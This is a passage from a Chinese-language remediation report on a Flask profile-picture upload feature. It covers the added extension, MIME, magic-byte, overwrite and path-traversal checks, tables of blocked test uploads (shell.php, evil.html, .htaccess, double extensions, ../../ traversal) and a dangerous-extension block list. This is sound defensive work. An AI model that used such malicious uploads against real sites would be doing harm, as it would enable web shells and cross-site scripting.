    return name
```

**最终路径合法性校验：**

```python
# 保存前确认文件在 uploads 目录内
save_path = os.path.join(UPLOAD_FOLDER, filename)
real_path = os.path.realpath(save_path)          # 解析所有符号链接和 ..
if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):
    error = "非法的文件路径"
```

---

## 四、修改文件清单

| 文件 | 修改类型 | 涉及漏洞 | 修改内容 |
|------|----------|---------|---------|
| `app.py` | 修改 | V-U01 ~ V-U10 | 新增 `ALLOWED_EXTENSIONS` 白名单（6种图片格式）；新增 `ALLOWED_MIMETYPES` 白名单（6种图片 MIME）；新增 `IMAGE_SIGNATURES` 魔术字节签名库（6种格式）；新增 `DANGEROUS_EXTENSIONS` 黑名单（15种危险扩展名）；新增 `allowed_file()` 函数（扩展名白名单 + 黑名单 + 隐藏文件检测）；新增 `validate_image_content()` 函数（文件头签名匹配）；新增 `secure_filename_original()` 函数（路径遍历 + 空字节防护）；重写 `upload()` 路由（集成 5 层校验逻辑）；新增路径合法性 `os.path.realpath()` 检查 |

---

## 五、修复验证结果

### 安全测试

| 测试项 | 对应漏洞 | 结果 |
|--------|---------|------|
| 上传 `evil.html` | V-U01 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `shell.php` | V-U01, V-U06 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `steal.js` | V-U01 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `evil.svg` | V-U04 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `.htaccess` | V-U05 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `shell.phtml` | V-U06 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `shell.asp` | V-U06 | ✅ 被阻止 — "不支持的文件类型" |
| 上传无扩展名文件 | V-U09 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `test.php.jpg` | V-U10 | ✅ 被阻止 — "不支持的文件类型" |
| 上传 `a.htaccess.png` | V-U10 | ✅ 被阻止 — "不支持的文件类型" |
| 同名文件二次上传 | V-U07 | ✅ 第 2 次被拦截 — "文件已存在" |
| 伪造 Content-Type | V-U08 | ✅ 非图片 MIME 被拒绝 |
| 路径遍历 `../../x.txt` | V-U01 增强 | ✅ 路径被清洗 |

### 快乐路径测试

| 测试项 | 结果 |
|--------|------|
| 上传真实 PNG 文件 | ✅ 成功上传，导航栏显示头像 |
| 上传真实 JPG 文件 | ✅ 成功上传 |
| 上传真实 GIF 文件 | ✅ 成功上传 |
| 上传后导航栏显示头像 | ✅ 导航栏圆形缩略图正常 |
| 点击头像进入修改页 | ✅ 可重新上传替换 |
| 上传页面显示当前头像 | ✅ 已有头像时显示预览 |

### 原有功能回归测试

| 测试项 | 结果 |
|--------|------|
| 搜索功能 | ✅ 正常 |
| 注册功能 | ✅ 正常 |
| 登录功能 | ✅ 正常 |
| 退出功能 | ✅ 正常 |

---

## 六、安全对比：修复前 vs 修复后

| 攻击向量 | 修复前 | 修复后 | 拦截层级 |
|---------|--------|--------|---------|
| 上传 `shell.php`（WebShell） | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1: 扩展名白名单 |
| 上传 `evil.html`（XSS） | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1: 扩展名白名单 |
| 上传 `steal.js`（CSP绕过） | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1: 扩展名白名单 |
| 上传 `evil.svg`（SVG XSS） | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1 + Layer 3 |
| 上传 `.htaccess`（配置篡改） | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1: 隐藏文件检测 |
| 上传无扩展名恶意文件 | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1: 必须含扩展名 |
| 上传 `test.php.jpg`（双扩展名） | ✅ 成功 | ❌ "不支持的文件类型" | Layer 1: 黑名单分段检查 |
| 覆盖已存在的文件 | ✅ 静默覆盖 | ❌ "文件已存在" | Layer 4: 覆盖保护 |
| 伪造 Content-Type 绕过 | ✅ 可伪造 | ❌ MIME 校验失败 | Layer 2 + Layer 3 |
| fake.txt → image/png（无魔术字） | ✅ 成功 | ❌ "文件内容校验失败" | Layer 3: 魔术字节 |
| 路径遍历 `../../x.txt` | ✅ 成功 | ❌ 路径被清洗 | Layer 5: 路径防护 |
| 真实的 PNG 图片上传 | ✅ 成功 | ✅ 成功 | — |

---

## 七、五层防御架构图

```
用户上传文件
    │
    ▼
┌────────────────────────────────────────────────────┐
│ Layer 1: 扩展名校验（allowed_file）                │
│ ├── 白名单：仅允许 png/jpg/jpeg/gif/webp/bmp      │
│ ├── 黑名单：拒绝 php/asp/jsp/exe/htaccess 等 15 种 │
│ ├── 拒绝隐藏文件（以 . 开头）                      │
│ └── 分段检查（拒绝双扩展名绕过）                   │
├────────────────────────────────────────────────────┤
    │ 通过
    ▼
┌────────────────────────────────────────────────────┐
│ Layer 2: Content-Type 校验                        │
│ ├── 仅当客户端声明时检查                           │
│ └── 声明必须为 image/png/jpeg/gif/webp/bmp        │
├────────────────────────────────────────────────────┤
    │ 通过
    ▼
┌────────────────────────────────────────────────────┐
│ Layer 3: 魔术字节校验（validate_image_content）    │
│ ├── 读取文件头 16 字节                             │
│ ├── 匹配 PNG/JPEG/GIF/WEBP/BMP 签名              │
│ └── WEBP 特殊处理（深层验证）                      │
├────────────────────────────────────────────────────┤
    │ 通过
    ▼
┌────────────────────────────────────────────────────┐
│ Layer 4: 文件覆盖保护                             │
│ ├── os.path.exists() 检查                         │
│ └── 已存在则返回错误，不执行保存                   │
├────────────────────────────────────────────────────┤
    │ 通过
    ▼
┌────────────────────────────────────────────────────┐
│ Layer 5: 路径遍历防护                             │
│ ├── secure_filename_original() 清洗                │
│ │   ├── 去除 ../ 和 \\ 路径分隔符                 │
│ │   ├── 去除空字节 \x00                           │
│ │   └── 只取最后一段文件名                         │
│ └── os.path.realpath() 验证目录边界               │
├────────────────────────────────────────────────────┤
    │ 全部通过
    ▼
┌────────────────────────────────────────────────────┐
│  ✅ 文件保存到 static/uploads/                     │
└────────────────────────────────────────────────────┘
```

---

## 八、后续建议

| 优先级 | 建议 | 说明 |
|--------|------|------|
| 🔴 高 | **限制上传文件大小** | 当前 16MB 对于头像偏大，建议降至 2-5MB |
| 🔴 高 | **使用随机文件名** | 用 UUID 重命名文件取代原始文件名，彻底杜绝路径遍历和枚举 |
| 🟠 中 | **部署 AV 扫描** | 集成 ClamAV 在上传时扫描文件，防范已知恶意软件 |
| 🟠 中 | **WAF 规则** | 在反向代理层添加文件上传检测规则 |
| 🟢 低 | **图片缩略图** | 上传后服务端用 Pillow 重新生成缩略图，丢弃原始文件内容 |
| 🟢 低 | **HTTPS 部署** | 上传的文件应在 HTTPS 下传输，防止中间人篡改 |
